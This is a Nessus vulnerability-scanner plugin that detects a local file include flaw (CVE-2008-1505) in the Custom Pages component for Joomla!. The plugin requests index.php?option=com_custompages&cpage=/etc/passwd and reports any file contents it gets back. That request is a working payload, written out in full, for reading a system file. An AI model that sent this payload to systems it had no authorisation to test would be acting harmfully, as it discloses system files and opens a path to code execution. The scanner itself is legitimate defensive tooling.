#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31646);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_cve_id("CVE-2008-1505");
  script_bugtraq_id(28409);
  script_osvdb_id(43672);
  script_xref(name:"EDB-ID", value:"5294");

  script_name(english:"Custom Pages for Joomla! 'cpage' Parameter Local File Include");
  script_summary(english:"Attempts to read a local file with Custom Pages.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Custom Pages component for Joomla! running on the
remote host is affected by a local file include vulnerability due to
improper sanitization of user-supplied input to the 'cpage' parameter
before using it in the custompages.php script to include PHP code.
Regardless of the PHP 'register_globals' setting, an unauthenticated,
remote attacker can exploit this issue to disclose arbitrary files or
execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user ID.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:W/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/03/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Try to retrieve a local file.
file = "/etc/passwd";
url = "/index.php?option=com_custompages&cpage=" + file;

r = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);
res = r[2];

# There's a problem if...
if (
  # there's an entry for root or...
  egrep(pattern:"root:.*:0:[01]:", string:res) ||
  # we get an error claiming the file doesn't exist or...
  "main(" +file+ "): failed to open stream: No such file" >< res ||
  "include(" +file+ ") [function.include]: failed to open stream: No such file" >< res ||
  # we get an error about open_basedir restriction.
  "open_basedir restriction in effect. File(" +file >< res
)
{
  contents = res;
  if ('body_outer">' >< contents) contents = strstr(contents, 'body_outer">') - 'body_outer">';
  if ('</td>' >< contents) contents = contents - strstr(contents, '</td>');
  if (contents)
  {
    while (strlen(contents) && contents[0] =~ '[ \t\n\r]')
      contents = substr(contents, 1);
  }
  if (contents) contents = chomp(contents);

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : "/etc/passwd",
    request     : make_list(install_url + url),
    output      : contents,
    attach_type : 'text/plain'
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
